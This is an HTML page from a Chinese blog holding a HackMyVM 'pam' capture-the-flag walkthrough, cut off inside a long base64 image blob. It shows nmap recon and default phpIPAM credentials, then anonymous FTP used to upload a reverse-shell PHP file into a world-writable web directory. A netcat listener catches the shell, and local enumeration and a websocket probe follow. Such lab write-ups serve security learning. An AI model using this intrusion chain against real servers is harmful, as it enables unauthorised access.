@@ -1,0 +1,614 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HMV-pam | Moriiの博客</title><meta name="keywords" content="HMV"><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HMV-pam信息搜集┌──(root㉿kali)-[~] └─# nmap 192.168.1.136 -p- -A Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2026-03-25 23:04 EDT Nmap scan report for bogon (192.168.1.136) Host is up (0.00072s la">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-pam">
+<meta property="og:url" content="https://drume2.github.io/posts/a7519f09.html">
+<meta property="og:site_name" content="Moriiの博客">
+<meta property="og:description" content="HMV-pam信息搜集┌──(root㉿kali)-[~] └─# nmap 192.168.1.136 -p- -A Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2026-03-25 23:04 EDT Nmap scan report for bogon (192.168.1.136) Host is up (0.00072s la">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp">
+<meta property="article:published_time" content="2026-03-26T03:03:55.000Z">
+<meta property="article:modified_time" content="2026-03-26T03:30:34.210Z">
+<meta property="article:author" content="Morii">
+<meta property="article:tag" content="HMV">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp"><link rel="shortcut icon" href="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp"><link rel="canonical" href="https://drume2.github.io/posts/a7519f09"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HMV-pam',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-03-26 11:30:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/background.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/index_ee.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">95</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Moriiの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HMV-pam</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-26T03:03:55.000Z" title="发表于 2026-03-26 11:03:55">2026-03-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-26T03:30:34.210Z" title="更新于 2026-03-26 11:30:34">2026-03-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HMV/">HMV</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HMV-pam"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HMV-pam"><a href="#HMV-pam" class="headerlink" title="HMV-pam"></a>HMV-pam</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~]
+└─# nmap 192.168.1.136 -p- -A
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2026-03-25 23:04 EDT
+Nmap scan report for bogon (192.168.1.136)
+Host is up (0.00072s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21&#x2F;tcp open  ftp     vsftpd 3.0.3
+80&#x2F;tcp open  http    nginx 1.18.0
+|_http-title: Site doesn&#39;t have a title (text&#x2F;html).
+|_http-server-header: nginx&#x2F;1.18.0
+MAC Address: 08:00:27:05:90:7D (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5 cpe:&#x2F;o:mikrotik:routeros:7 cpe:&#x2F;o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.72 ms bogon (192.168.1.136)
+
+OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 15.42 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>21和80开放了</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~]
+└─# curl 192.168.1.136
+phpipam is ready.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>80的默认界面只提示了phpipam开启了，通过扫描目录可以指导有个<code>phpipam</code>路径，去访问一下</p>
+<p><img src="/posts/a7519f09/image-20260326110609370.png" alt="image-20260326110609370"></p>
+<p>这里的用户名为Admin密码是password,进去也么什么用，接着去看一下21ftp</p>
+<h2 id="21ftp服务探测"><a href="#21ftp服务探测" class="headerlink" title="21ftp服务探测"></a>21ftp服务探测</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~]
+└─# lftp 192.168.1.136 -u anonymous
+Password:
+lftp anonymous@192.168.1.136:~&gt; ls &#x2F;home
+drwxr-xr-x    2 1001     1001         4096 Aug 18  2022 anonymous
+drwxr-xr-x    3 1000     1000         4096 Aug 18  2022 italia<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用户名和密码都anonymous</p>
+<p>可以发现在home目录下还有有个用户italia</p>
+<p>找一下可写的路径</p>
+<pre class="line-numbers language-none"><code class="language-none">lftp anonymous@192.168.1.136:~&gt; find -l  &#x2F;var&#x2F;www&#x2F;html |grep &quot;d.w..w..w.&quot;
+drwxrwxrwx  33&#x2F;33            4096 2022-05-02 08:00:00 &#x2F;var&#x2F;www&#x2F;html&#x2F;phpipam&#x2F;app&#x2F;admin&#x2F;import-export&#x2F;upload&#x2F;
+drwxrwxrwx  33&#x2F;33            4096 2026-03-25 23:45:30 &#x2F;var&#x2F;www&#x2F;html&#x2F;phpipam&#x2F;app&#x2F;subnets&#x2F;import-subnet&#x2F;upload&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>这两个路径可以写入,直接cd到这个路径下，put一个反弹shell的文件上去</p>
+<pre class="line-numbers language-none"><code class="language-none">lftp anonymous@192.168.1.136:&#x2F;var&#x2F;www&#x2F;html&#x2F;phpipam&#x2F;app&#x2F;admin&#x2F;import-export&#x2F;upload&gt; put re.php
+6075 bytes transferred
+lftp anonymous@192.168.1.136:&#x2F;var&#x2F;www&#x2F;html&#x2F;phpipam&#x2F;app&#x2F;admin&#x2F;import-export&#x2F;upload&gt; chmod 777 re.php
+lftp anonymous@192.168.1.136:&#x2F;var&#x2F;www&#x2F;html&#x2F;phpipam&#x2F;app&#x2F;admin&#x2F;import-export&#x2F;upload&gt; ls
+-rwxrwxrwx    1 1001     1001         6075 Mar 26 04:13 re.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着去访问一下路径</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~]
+└─# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.1.7] from (UNKNOWN) [192.168.1.136] 51412
+Linux pam 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64 GNU&#x2F;Linux
+ 04:15:28 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)
+&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>拿到了一个shell，稳固一下</p>
+<h2 id="www-data–-gt-italia"><a href="#www-data–-gt-italia" class="headerlink" title="www-data–&gt;italia"></a>www-data–&gt;italia</h2><pre class="line-numbers language-none"><code class="language-none">www-data@pam:&#x2F;home$ cd italia&#x2F;
+www-data@pam:&#x2F;home&#x2F;italia$ ls
+pazz.php  user.txt
+www-data@pam:&#x2F;home&#x2F;italia$ ls -la
+total 48
+drwxr-xr-x 3 italia italia 4096 Aug 18  2022 .
+drwxr-xr-x 4 root   root   4096 Aug 18  2022 ..
+-rw------- 1 italia italia   98 Aug 18  2022 .Xauthority
+lrwxrwxrwx 1 italia italia    9 Aug 18  2022 .bash_history -&gt; &#x2F;dev&#x2F;null
+-rw-r--r-- 1 italia italia  220 Aug 18  2022 .bash_logout
+-rw-r--r-- 1 italia italia 3526 Aug 18  2022 .bashrc
+drwxr-xr-x 3 italia italia 4096 Aug 18  2022 .local
+-rw-r--r-- 1 italia italia  807 Aug 18  2022 .profile
+-rw-r--r-- 1 italia italia   66 Aug 18  2022 .selected_editor
+-rwxrwx--- 1 italia italia 9510 Aug 18  2022 pazz.php
+-rw------- 1 italia italia   24 Aug 18  2022 user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在italia用户的目录下发现了一个pazz.php但是当前用户无法读取，尝试寻找其他路径</p>
+<p>通过输入<code>ps -ef</code>，发现了一个进程</p>
+<pre class="line-numbers language-none"><code class="language-none">italia       414     412  0 03:34 ?        00:00:00 &#x2F;usr&#x2F;bin&#x2F;php -q &#x2F;home&#x2F;italia&#x2F;pazz.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这是开启了一个web服务，看一下端口开放</p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@pam:&#x2F;home&#x2F;italia$ ss -lntup
+Netid       State         Recv-Q        Send-Q               Local Address:Port                Peer Address:Port       Process
+udp         UNCONN        0             0                          0.0.0.0:68                       0.0.0.0:*
+tcp         LISTEN        0             80                       127.0.0.1:3306                     0.0.0.0:*
+tcp         LISTEN        0             511                        0.0.0.0:80                       0.0.0.0:*           users:((&quot;nginx&quot;,pid&#x3D;464,fd&#x3D;6))
+tcp         LISTEN        0             0                        127.0.0.1:12345                    0.0.0.0:*
+tcp         LISTEN        0             511                           [::]:80                          [::]:*           users:((&quot;nginx&quot;,pid&#x3D;464,fd&#x3D;7))
+tcp         LISTEN        0             32                               *:21                             *:*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>额外多了一个12345端口，nc看一下情况</p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@pam:&#x2F;home&#x2F;italia$ nc 127.0.0.1 12345
+
+HTTP&#x2F;1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Accept: Kfh9QIsMVZcl6xEPYxPHzW8SZ8w&#x3D;
+
+
+iVBORw0KGgoAAAANSUhEUgAAAu4AAAHUCAIAAADqdjrLAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
+jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABiKSURBVHhe7d3rdeLIFoDRicsBOR5H42QczL2S
+kN0YTj0klcCHtfefmXFDqVSwVN&#x2F;QgP&#x2F;7HwBAWlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiU
+AQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkA
+IDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQAS
+kzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEp
+AwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIA
+QGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAk
+JmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJS
+BgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAkJmUA
+gMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJSBgBI
+TMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAkJmUAgMSk
+DACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJSBgBITMoA
+AIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAkJmUAgMSkDACQ
+mJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJSBgBITMoAAIlJ
+GQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAkJmUAgMSkDACQmJQB
+ABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJSBgBITMoAAIlJGQAg
+MSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRn4y74+P97vfXytf&#x2F;wEX8uU3t7e&#x2F;vtl
++sE0r8+vTTMLz24aZP3jE1RnP+rIPwe5Ocp8mGWVNhwnfgLs88ynDZxJysBf9vVxux3O3j&#x2F;XP36k
+eVONJnNr2q17t+rw7N5O2XGnvOia&#x2F;X9v+1uq+xiLZZ2aR4qfAPs85WkDDyBl4C&#x2F;7IymzaY9edAXJ
+g1Jm++ynSWzsma++zrvXSCcpA21SBh5q2vLulTfvv5Aye3fTt+Y0H5Ey2zPmW&#x2F;9E9h&#x2F;jW&#x2F;GVLCkD
+bVIGHurzfd1XrpX3mKenzLGttFEDp6fM0RDoWehBsVE41KDRF1KGVyVl4KFypcyAjbQ213D4cSkT
+rvVGrdkMSo3iYaQMtEkZeKhUKTOiBTaf3aiUGRUBtfl0HGP+1NLF+oPI1ifAPlKGVyVl4KE2psz&#x2F;
+vj4D2z7yvFd1F13erbrOY&#x2F;pn9dNN215yGJQytQxbJ&#x2F;9r9pVzLT485RUqvpk3WqrNsTS&#x2F;KXmHdUh4
+OVIGHmpryjxPeZ8uvEW1&#x2F;EGh0l59XspUIqPYVeU37xYen8JBuk7gqmiqj&#x2F;55SwSvQ8rAQ6VJmVIM
+1LfR0msh8Rmetk8XS6ax0tumH9560&#x2F;Tnz7PVby9loE3K8Oetr45vv3iv97tYfzbAOuDF+rN+D0+Z
+daIX6896FHb11lQLERFvvqft0zsnv3H6j3gspQy0SRme53P5bvdbP&#x2F;+XGr2poP1FsrX3PcyD73yf
+ydFh529QW6z3uXX5w&#x2F;n81jusfu73S7MnPj&#x2F;K071MuPBWjh+FPb1jo44zItx9z9qn909+012lDPwN
+Uobnqe15tS8dK1zIg&#x2F;QpaAfRlTHDFnbIO7cbYXy&#x2F;8nbZP9tF8d2pW4LkVnzXaM5n7dMHJl9Y8fC+
+&#x2F;Se6n5SBNinD8xQ3nMa+370p1vTlzLBhewc6lDKbZ7uKguYR23Q84dNSpm&#x2F;y8SJuSJmxq3TWEsEr
+kTI8TyFlah+LnQT7xN4tvLHljBy2d6zb+8b3Cyde2lj73A4pZX4JJ1V5UOekHZIbZy0RvBIpw&#x2F;Ps
+2XuD7aiyoTRVdrexw&#x2F;aOdnvP+H7BtMeGjJS5EU+q&#x2F;ai+vb2&#x2F;fxz5IqCzlgheiZTheTbvvuEV&#x2F;Nge
+XtwUBg&#x2F;b3vQu9qbMkeluWFYp81vvw7q6hM2mrtl4hMiABYW&#x2F;TcrwPK3td77wLy4X8&#x2F;iKXBvkZoBY
+vMGNH3b9OHQ48Py3ERfrjX90pkxhussnlS5fD7z8I&#x2F;pcU2GDj0fsq4Fu6VOm&#x2F;kSpmZ5EXU0jZaBN
+yvA8lV1g&#x2F;mb29VYX01YcXo9LY9xdvsvf5RrtcCcNOwlHLm+y+1OmtoHNRbU0TflG8Qr01UC3F0iZ
+0h06Nd99LmWgTcrwPKVe2LBhFoYoDBDfOrjSnzTsLLxx+YT7Uia6Vcci1l4ViE+qY9AtwrPLljKT
+Y71RHfvY0IsBCwp&#x2F;m5TheQrBsOXKGw5RHqB3iztp2Fl42&#x2F;ImG+9kd7ePJ7y8L2PnNrblnHZ7lZSZ
+VX6FU9vWJ8AmAxYU&#x2F;jYpw&#x2F;PEG86W7bJzo&#x2F;&#x2F;RefuThl2ckzLxzX5ZviV4Mr95piNwpMwv3ZNqfNFy
+UekAHY9si5Th5UkZnifecLZceDs3+n&#x2F;6QuKkYRcbbjrrnUq8lg3l7&#x2F;otDVhZgz3Cs8udMlemYFze
+af0+&#x2F;+6JdZyywhHi6Sxh2qvxCyshPynD88QbjpS51j2VwpbXVnjj6ZEa6BZO+mVS5s6UNpVfKxEf
+4qwlglciZXieeMORMte2TCVezx7BePFglTXY46x9+sjk4xUfGQ&#x2F;xEQrHOGuJ4JVIGZ4n3nCkzLWN
+U5l&#x2F;kfZ6m23uRjzw4Hx9zu&#x2F;JufURzPmsffrIMyte8cHxEE4wPMZZSwSvRMrwPEc2nIuTmuOkYRcb
+bjrbPJXZ&#x2F;BaNvjdo&#x2F;HM7ZHzg1pFn8T0fuk9vmMKd+FnZcd5b9D+sZy0RvBIpw&#x2F;M8PmU6b3&#x2F;SsItH
+pMyN+VuEl2&#x2F;7vbwFdR3j1s2Y8YE7Hp3CHcMph7cdsU&#x2F;vf2rF99y44k39D+tpSwQvRMrwPMdTJh6i
+PEJ8xPsd5KRhZ+Ftyxtl&#x2F;563wVc0idsxC0nSOna8FoV7nbZP75z89vvN35pc&#x2F;hhYUf8T7LQlghci
+ZXieeNfbdJneNkT3rU8adhbeuLzDxntreWf96NtXg2HvxoxPa1L+rv1SCZQmfN4+XZxJbfTNd&#x2F;q5
+Q+1j7fcKxwkX6bwlgtchZXiebcEQK+2399ttcZ+KdpCThp3EIxduXBo+vvnPbZsbazTq&#x2F;ZjFlpmP
+cL8QlW+7LZ1eeHZj9uni4xIvz9dn+fbFGd0u0PwVLvWFn49TWqb4KCcuEbwMKcPzxFvltst0Zcea
+tqxpZyn8Puh&#x2F;wm32pGEnxT5Yv87s5m7xRKLBg4GnnXWa6fJWmW&#x2F;zG4LDSUfLXmmZi8ucJ+t&#x2F;x8qP
+aGGZ10G36Vu5a+sdm++OLjyUtdVZvlh5&#x2F;a3ki&#x2F;ltSvUDFVbpzCWCVyFleJ4RKdOx39aVLu8nDdsa
+t29Dvhu9vW+3xBM+uAqz2uN5fNr&#x2F;3J&#x2F;AmNELj+TIqc8Khzl5ieA1SBmeZ0zKHLrYVy7uzxn29p7x
+zW9udTw4iot+dCetP5pHR78Wrfnx8UuP5IDGu1Z+wpy9RPAKpAzPMyhl9l&#x2F;uG5f2c4atj3p73&#x2F;jW
+v241YFetzvjAb3xuLPAj9ukjv6+6+lQcN&#x2F;cHHab9cEBWUobnGZYyk+07VtdxThm21h63u01Hysw3
+OrBfT4M1Z7xnP+15Z8Zj9uldRwne2HxvfqvzsTN4a&#x2F;2uRykDbVKG5xmZMpPaR2hubPkqkDOGLe9P
+u1JmUf1VhQXNjfSfLcO3P8izetw+veFRnOff&#x2F;&#x2F;SY7Fn5Sd8qSRlokzI8z+CUWSzbSvniP3+K42vH
++OOH&#x2F;Yr&#x2F;j35&#x2F;yqyW377cfK1g9zo0tu1le+4f98H7dHP23Q0WmkavPktW244iZaBNyvCqlk8ef5s&#x2F;
+h7z+&#x2F;KAzhp2HWa0&#x2F;GWQecZ3qxcBD&#x2F;B563LiPcfbspxHPW3rgNykDACQmZQCAxKQMAJCYlAEAEpMy
+AEBiUgYASEzKAACJSRkAIDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMA
+JCZlAIDEpAwAkJiUAQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBi
+UgYASEzKAACJSRkAIDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZl
+AIDEpAwAkJiUAQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYA
